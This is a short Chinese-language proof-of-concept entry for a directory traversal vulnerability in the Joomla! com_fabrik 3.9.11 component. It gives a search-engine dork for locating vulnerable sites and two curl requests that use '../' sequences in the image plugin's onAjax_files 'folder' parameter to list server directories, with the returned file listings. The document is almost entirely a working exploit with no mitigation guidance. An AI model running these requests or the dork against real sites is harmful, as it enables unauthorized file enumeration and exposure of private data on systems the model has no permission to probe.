Joomla! com\_fabrik 3.9.11 目录遍历漏洞
=======================================

一、漏洞简介
------------

关键字:inurl:\"index.php?option=com\_fabrik\"

二、漏洞影响
------------

Version: 3.9

三、复现过程
------------

### poc

    $> curl -X GET -i "http://www.0-sec.org/joomla/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/"
    ...snip...
    [{"value":"eila.jpg","text":"eila.jpg","disable":false},{"value":"eilanya.jpg","text":"eilanya.jpg","disable":false},{"value":"topsecret.png","text":"topsecret.png","disable":false}]
    ...snip...
    $> curl -X GET -i "http://www.0-sec.org/joomla/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../home/user123/Pictures/"
    ...snip...
    [{"value":"Revision2017_Banner.jpg","text":"Revision2017_Banner.jpg","disable":false},{"value":"Screenshot from 2019-02-23 22-43-54.png","text":"Screenshot from 2019-02-23 22-43-54.png","disable":false},{"value":"Screenshot from 2019-03-09 14-59-22.png","text":"Screenshot from 2019-03-09 14-59-22.png","disable":false},{"value":"Screenshot from 2019-03-09 14-59-25.png","text":"Screenshot from 2019-03-09 14-59-25.png","disable":false},{"value":"Screenshot from 2019-03-16 23-17-05.png","text":"Screenshot from 2019-03-16 23-17-05.png","disable":false},{"value":"Screenshot from 2019-03-18 07-30-41.png","text":"Screenshot from 2019-03-18 07-30-41.png","disable":false},{"value":"Screenshot from 2019-03-18 08-23-45.png","text":"Screenshot from 2019-03-18 08-23-45.png","disable":false},{"value":"Screenshot from 2019-04-08 00-09-36.png","text":"Screenshot from 2019-04-08 00-09-36.png","disable":false},{"value":"Screenshot from 2019-04-08 10-34-23.png","text":"Screenshot from 2019-04-08 10-34-23.png","disable":false},{"value":"Screenshot from 2019-04-13 08-23-48.png","text":"Screenshot from 2019-04-13 08-23-48.png","disable":false},{"value":"Screenshot from 2019-05-24 23-14-05.png","text":"Screenshot from 2019-05-24 23-14-05.png","disable":false},{"value":"b.jpg","text":"b.jpg","disable":false},{"value":"by_gh0uli.tumblr.com-8755.png.jpeg","text":"by_gh0uli.tumblr.com-8755.png.jpeg","disable":false},{"value":"max_payne_06.jpg","text":"max_payne_06.jpg","disable":false},{"value":"xxx.jpg","text":"xxx.jpg","disable":false}]
    ...snip...
